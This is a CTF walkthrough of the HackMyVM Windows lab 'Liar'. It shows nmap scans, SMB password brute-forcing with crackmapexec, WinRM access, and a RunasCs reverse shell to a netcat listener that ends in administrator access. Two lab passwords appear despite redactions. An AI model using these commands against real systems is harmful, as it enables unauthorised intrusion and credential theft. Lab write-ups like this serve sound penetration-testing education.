---
title: CTF Walkthrough for HackMyVM Machine Liar
date: 2024-10-12 00:00:00 +0300
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, ]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-10-12-liar/box-liar.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Liar a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Literal<br>
Goal: Get two flags<br>
OS: Windows<br>
Download link: [Liar](https://downloads.hackmyvm.eu/liar.zip)<br>
### Tools used
1) Nmap<br>
2) CrackMapExec<br>
   
## Reconnaissance

First of all, we need to identify our target on the network. We do this by performing a host discovery scan on the current subnet.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Liar/Scans/Service]
└─$ nmap -n 10.0.2.16/24 -sn -oN live-hosts.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 11:38 BST
<SNIP>
Nmap scan report for 10.0.2.16
Host is up (0.00036s latency).
Nmap scan report for 10.0.2.30
Host is up (0.00063s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.51 seconds
```

After we have obtained the IP address of our target, we can perform a service scan to identify running services on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Liar/Scans/Service]
└─$ nmap -n 10.0.2.30 -sC -sV -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 11:40 BST
Nmap scan report for 10.0.2.30
Host is up (0.00038s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WIN-IURF14RBVGV, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:4b:24:d5 (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-06T10:40:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.45 seconds
```

The target runs an SMB and a Microsoft IIS web server. When we access the web application, the default page looks like a letter and has a name at the end.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Liar/Scans/Service]
└─$ curl http://10.0.2.30            
Hey bro,
You asked for an easy Windows VM, enjoy it.

- nica    
```

## Exploitation

We can use this name to attempt a brute-force attack against the SMB service.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Liar/Scans/Service]
└─$ crackmapexec smb 10.0.2.30 -u nica -p /usr/share/wordlists/rockyou.txt | grep +       
SMB                      10.0.2.30       445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:<REDACTED>  
```

The brute-force attack was successful and we obtained the password of Nica. We can use these credentials to brute force users' RIDs on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Liar/Scans/Service]
└─$ crackmapexec smb 10.0.2.30 -u nica -p hardcore --rid-brute | grep SidTypeUser
SMB                      10.0.2.30       445    WIN-IURF14RBVGV  500: WIN-IURF14RBVGV\Administrador (SidTypeUser)
SMB                      10.0.2.30       445    WIN-IURF14RBVGV  501: WIN-IURF14RBVGV\Invitado (SidTypeUser)
SMB                      10.0.2.30       445    WIN-IURF14RBVGV  503: WIN-IURF14RBVGV\DefaultAccount (SidTypeUser)
SMB                      10.0.2.30       445    WIN-IURF14RBVGV  504: WIN-IURF14RBVGV\WDAGUtilityAccount (SidTypeUser)
SMB                      10.0.2.30       445    WIN-IURF14RBVGV  1000: WIN-IURF14RBVGV\nica (SidTypeUser)
SMB                      10.0.2.30       445    WIN-IURF14RBVGV  1001: WIN-IURF14RBVGV\akanksha (SidTypeUser)
```

The brute-force attack yields a second user on the target i.e. `akanksha`. We can perform a second password brute-force against the SMB service for this username.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Liar/Misc File]
└─$ crackmapexec smb 10.0.2.30 -u akanksha -p /usr/share/wordlists/rockyou.txt | grep +
SMB                      10.0.2.30       445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:<REDACTED> 
```

Now that we have the credentials of the local users on the system we can now attempt to connect remotely to the Windows host. One common method is by using WinRM service. But before we use it we need to scan the port to verify if it is open.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Liar/Misc File]
└─$ nmap -n 10.0.2.30 -p5986,5985                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 12:06 BST
Nmap scan report for 10.0.2.30
Host is up (0.00061s latency).

PORT     STATE  SERVICE
5985/tcp open   wsman
5986/tcp closed wsmans

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
```

Now that we know that WinRm port is open we can attempt to connect to WinRM using both accounts.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Liar/Misc File]  
└─$ evil-winrm -i 10.0.2.30 -u nica -p <REDACTED>                     
Evil-WinRM shell v3.5
<SNIP>

*Evil-WinRM* PS C:\Users\nica\Documents> ls ..

    Directorio: C:\Users\nica


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018   9:12 AM                Desktop
d-r---        9/26/2023   6:44 PM                Documents
<SNIP>
-a----        9/26/2023   6:44 PM             10 user.txt
```

We will notice that only Nica's account can connect to the Windows host remotely via WinRM. We can use this access to read the user flag on the target.

## Post Exploitation

We have a foothold on the target as the user Nica. Remember that we brute-force Akanksha's password. Since we cannot log into the target using this account we can use the [RunasCs binary](https://github.com/antonioCoco/RunasCs) to run specific processes with different permissions than the user's current logon provides using explicit credentials. We can upload the binary to the target using our current WinRM session.
```shell
*Evil-WinRM* PS C:\Users\nica\Documents> upload RunasCs.exe                                    
Info: Uploading /home/pentester/Desktop/HackMyVM/Liar/Misc File/RunasCs.exe to C:\Users\nica\Documents\RunasCs.exe
                                         
Data: 68948 bytes of 68948 bytes copied
                                         
Info: Upload successful!
```

After uploading the RunasCs executable, we can run a simple command i.e. `whoami /all` to enumerate Akanksha's user account.
```shell
*Evil-WinRM* PS C:\Users\nica\Documents> .\RunasCs.exe akanksha <REDACTED>  "cmd /c whoami /all"


INFORMACI…N DE USUARIO
----------------------

Nombre de usuario        SID
======================== ==============================================
win-iurf14rbvgv\akanksha S-1-5-21-2519875556-2276787807-2868128514-1001


INFORMACI…N DE GRUPO
--------------------

Nombre de grupo                              Tipo           SID                                            Atributos
============================================ ============== ============================================== ========================================================================
Todos                                        Grupo conocido S-1-1-0                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
WIN-IURF14RBVGV\Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                             Alias          S-1-5-32-545                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\INTERACTIVE                     Grupo conocido S-1-5-4                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESI…N EN LA CONSOLA               Grupo conocido S-1-2-1                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compaÏ­a                   Grupo conocido S-1-5-15                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci½n NTLM              Grupo conocido S-1-5-64-10                                    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192


INFORMACI…N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci½n                                  Estado
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci½n de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
```

We can see from the enumeration above that this account is a member of the built-in Administrators group. We can execute a reverse shell on the target but before we do that, let's start a listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Liar]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

Now that we have a listener on our attack host, we can execute a reverse shell as the Akanksha user.
```shell
*Evil-WinRM* PS C:\Users\nica\Documents> .\RunasCs.exe akanksha sweetgirl cmd.exe -r 10.0.2.16:1234

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-3deedc$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2824 created in background.
```

When we return to our listener we will see a reverse connection from the target. Since this account is a member of the Administrators group, we can use this access to read the root flag in the Administrator home directory.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Liar]
└─$ nc -lvnp 1234                              
listening on [any] 1234 ...                                                                   
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.30] 49678                                       
Microsoft Windows [Versin 10.0.17763.107]                                                     
(c) 2018 Microsoft Corporation. Todos los derechos reservados.                                
                    
C:\Windows\system32> dir C:\Users\Administrador
 El volumen de la unidad C no tiene etiqueta.
 El nmero de serie del volumen es: 26CD-AE41

 Directorio de C:\Users\Administrador

26/09/2023  18:36    <DIR>          .
<SNIP>
26/09/2023  15:24            16.418 new.cfg
26/09/2023  15:11    <DIR>          Pictures
26/09/2023  18:36                13 root.txt
26/09/2023  15:11    <DIR>          Saved Games
26/09/2023  15:11    <DIR>          Searches
26/09/2023  15:11    <DIR>          Videos
               2 archivos         16.431 bytes
              14 dirs  45.913.264.128 bytes libres
```

## Conclusion

Congratulations! In this walkthrough, you have exploited weak passwords to compromise an important account on the system that gave you administrator access. This machine was designed to show how the use of weak passwords could seriously affect the security posture of an organisation. Thank you for following up on this walkthrough.
